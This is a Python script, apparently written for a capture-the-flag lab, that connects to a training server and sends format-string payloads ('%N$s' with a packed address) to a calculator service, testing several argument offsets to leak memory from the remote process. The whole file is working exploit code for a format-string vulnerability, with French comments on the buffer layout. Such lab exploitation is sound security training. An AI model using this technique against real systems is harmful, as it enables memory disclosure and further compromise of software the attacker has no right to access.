import sys, re, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929


def collect(s, t=1.5):
    s.settimeout(0.5)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a_bytes, b_bytes=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    out = collect(s, 1.0)
    s.sendall(a_bytes + b"\n")
    time.sleep(0.5)
    out2 = collect(s, 0.6)
    s.sendall(b_bytes + b"\n")
    time.sleep(1.0)
    out3 = collect(s, 1.5)
    s.close()
    return out + out2 + out3


# A : prefixe 13 octets + spec 5 octets + pad 3 octets => adresse a l'offset 40 du buffer => arg 10+5 = 15
PAD = b"1" + b"A" * 12
for argpos in (14, 15, 16):
    fmt = ("%%%d$s" % argpos).encode()
    a = PAD + fmt + b"B" * (3) + struct.pack("<Q", 0x601030)
    out = run(a)
    m = re.search(rb"Calculating for A: (.*?) and B:", out, re.S)
    if m:
        raw = m.group(1)
        print("arg=%d -> brut=%r" % (argpos, raw[:120]))
        # extraire les octets non imprimables = adresse
        idx = raw.find(b"BBB")
        if idx >= 0:
            tail = raw[idx + 3:]
            print("    apres BBB:", tail[:24].hex(), "|", tail[:24])
    else:
        print("arg=%d -> pas de match: %r" % (argpos, out[:160]))
